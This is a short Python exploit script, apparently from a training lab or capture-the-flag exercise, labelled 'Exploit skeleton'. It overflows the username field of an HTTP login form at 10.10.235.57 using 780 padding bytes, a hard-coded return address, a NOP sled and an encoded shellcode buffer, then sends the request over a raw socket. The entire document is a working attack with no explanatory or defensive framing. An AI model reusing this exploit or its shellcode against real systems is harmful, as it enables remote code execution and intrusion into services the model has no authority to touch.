#Exploit skeleton

#!/usr/bin/python

import socket

import os

import sys

buf =  b""
buf += b"\xd9\xcc\xbf\xb4\x94\x1e\x91\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x52\x83\xc5\x04\x31\x7d\x13\x03\xc9\x87\xfc"
buf += b"\x64\xcd\x40\x82\x87\x2d\x91\xe3\x0e\xc8\xa0\x23\x74"
buf += b"\x99\x93\x93\xfe\xcf\x1f\x5f\x52\xfb\x94\x2d\x7b\x0c"
buf += b"\x1c\x9b\x5d\x23\x9d\xb0\x9e\x22\x1d\xcb\xf2\x84\x1c"
buf += b"\x04\x07\xc5\x59\x79\xea\x97\x32\xf5\x59\x07\x36\x43"
buf += b"\x62\xac\x04\x45\xe2\x51\xdc\x64\xc3\xc4\x56\x3f\xc3"
buf += b"\xe7\xbb\x4b\x4a\xff\xd8\x76\x04\x74\x2a\x0c\x97\x5c"
buf += b"\x62\xed\x34\xa1\x4a\x1c\x44\xe6\x6d\xff\x33\x1e\x8e"
buf += b"\x82\x43\xe5\xec\x58\xc1\xfd\x57\x2a\x71\xd9\x66\xff"
buf += b"\xe4\xaa\x65\xb4\x63\xf4\x69\x4b\xa7\x8f\x96\xc0\x46"
buf += b"\x5f\x1f\x92\x6c\x7b\x7b\x40\x0c\xda\x21\x27\x31\x3c"
buf += b"\x8a\x98\x97\x37\x27\xcc\xa5\x1a\x20\x21\x84\xa4\xb0"
buf += b"\x2d\x9f\xd7\x82\xf2\x0b\x7f\xaf\x7b\x92\x78\xd0\x51"
buf += b"\x62\x16\x2f\x5a\x93\x3f\xf4\x0e\xc3\x57\xdd\x2e\x88"
buf += b"\xa7\xe2\xfa\x1f\xf7\x4c\x55\xe0\xa7\x2c\x05\x88\xad"
buf += b"\xa2\x7a\xa8\xce\x68\x13\x43\x35\xfb\x16\x9c\x78\xdf"
buf += b"\x4e\x9e\x82\x1b\x5d\x17\x64\x49\x71\x7e\x3f\xe6\xe8"
buf += b"\xdb\xcb\x97\xf5\xf1\xb6\x98\x7e\xf6\x47\x56\x77\x73"
buf += b"\x5b\x0f\x77\xce\x01\x86\x88\xe4\x2d\x44\x1a\x63\xad"
buf += b"\x03\x07\x3c\xfa\x44\xf9\x35\x6e\x79\xa0\xef\x8c\x80"
buf += b"\x34\xd7\x14\x5f\x85\xd6\x95\x12\xb1\xfc\x85\xea\x3a"
buf += b"\xb9\xf1\xa2\x6c\x17\xaf\x04\xc7\xd9\x19\xdf\xb4\xb3"
buf += b"\xcd\xa6\xf6\x03\x8b\xa6\xd2\xf5\x73\x16\x8b\x43\x8c"
buf += b"\x97\x5b\x44\xf5\xc5\xfb\xab\x2c\x4e\x0b\xe6\x6c\xe7"
buf += b"\x84\xaf\xe5\xb5\xc8\x4f\xd0\xfa\xf4\xd3\xd0\x82\x02"
buf += b"\xcb\x91\x87\x4f\x4b\x4a\xfa\xc0\x3e\x6c\xa9\xe1\x6a"

crash = "A" * 780 + "\x83\x0C\x09\x10" +"\x90" * 16 + buf

fuzz="username="+crash+"&password=A"

buffer="POST /login HTTP/1.1\r\n"

buffer+="Host: 10.10.235.57\r\n"

buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"

buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"

buffer+="Accept-Language: en-US,en;q=0.5\r\n"

buffer+="Referer: http://10.10.235.57/login\r\n"

buffer+="Connection: close\r\n"

buffer+="Content-Type: application/x-www-form-urlencoded\r\n"

buffer+="Content-Length: "+str(len(fuzz))+"\r\n"

buffer+="\r\n"

buffer+=fuzz

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

expl.connect(("10.10.235.57", 80))

expl.send(buffer)

expl.close()
